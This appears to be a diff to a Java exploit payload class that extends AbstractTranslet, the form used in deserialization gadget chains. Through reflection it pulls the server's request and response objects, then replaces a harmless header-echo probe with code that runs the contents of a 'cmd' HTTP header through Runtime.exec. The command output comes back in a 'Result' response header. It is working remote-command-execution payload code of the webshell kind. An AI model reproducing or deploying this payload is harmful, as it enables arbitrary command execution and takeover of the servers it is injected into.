@@ -65,13 +65,18 @@ public class MyClassLoader2 extends AbstractTranslet {
                         Object req = f.get(processor);
                         Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
 //                        str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
-                        String str2= (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Testecho"});
-                        if (str2!= null && !str.isEmpty()){
-                            // 回显Testecho头，别500了不好看
-                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
-                            resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", str2});
-                            flag = true;
-                        }
+//                        String str2= (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"Testecho"});
+
+                        String cmd = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});;
+//                        String[] cmds = new String[]{"cmd.exe", "/c", "ipconfig"};
+//                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
+//                        String result = new String((new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
+                        String result = new String((new java.util.Scanner((Runtime.getRuntime().exec(cmd)).getInputStream())).useDelimiter("\\A").next().getBytes());
+                        // 回显Testecho头，别500了不好看
+//                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
+//                           resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", str2});
+                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Result", result});
+                        flag = true;
 
                         if (flag) break;
                     }
